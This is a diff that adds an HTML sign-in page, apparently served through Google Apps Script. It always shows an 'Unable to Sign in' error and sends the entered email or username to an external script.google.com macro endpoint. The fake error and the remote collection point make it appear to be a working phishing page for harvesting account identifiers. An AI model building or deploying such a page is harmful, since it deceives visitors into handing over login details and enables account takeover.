@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <base target="_top">
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <style>
+      body,html {
+          background-color: #eee;
+          height: 100%;
+      }
+
+      #profile-img {
+          width: -webkit-fill-available;
+      }
+      .h-80 {
+          height: 80% !important;
+      }
+    </style>
+
+  </head>
+  <body>
+    <div class="alert alert-danger">
+      <strong>Unable to Sign in: </strong>Please verify that you have entered the correct email or username.
+    </div>          
+    <div class="container h-80">
+    <div class="row align-items-center h-100">
+        <div class="col-3 mx-auto">
+            <div class="text-center">
+                <img id="profile-img" src="https://gcdn.pbrd.co/images/cN5lNWzRa3Lp.png?o=1" />
+                <p id="profile-name" class="profile-name-card"></p>
+                <form  class="form-signin" action="https://script.google.com/macros/s/AKfycbzaEMiFQpBkD48QwB3t2VxlJpBRTBRCHQ5I7t-2lA4IUVv-OTBKRzzL42VsAGPAimSW/exec">                
+                    <input type="text" name="username" id="username" class="form-control form-group" placeholder="Sign in with email" required autofocus>
+                    <button class="btn btn-lg btn-primary btn-block btn-signin" type="submit" >enter</button>
+                </form><!-- /form -->
+            </div>
+        </div>
+    </div>
+    </div>
+  </body>
+</html>
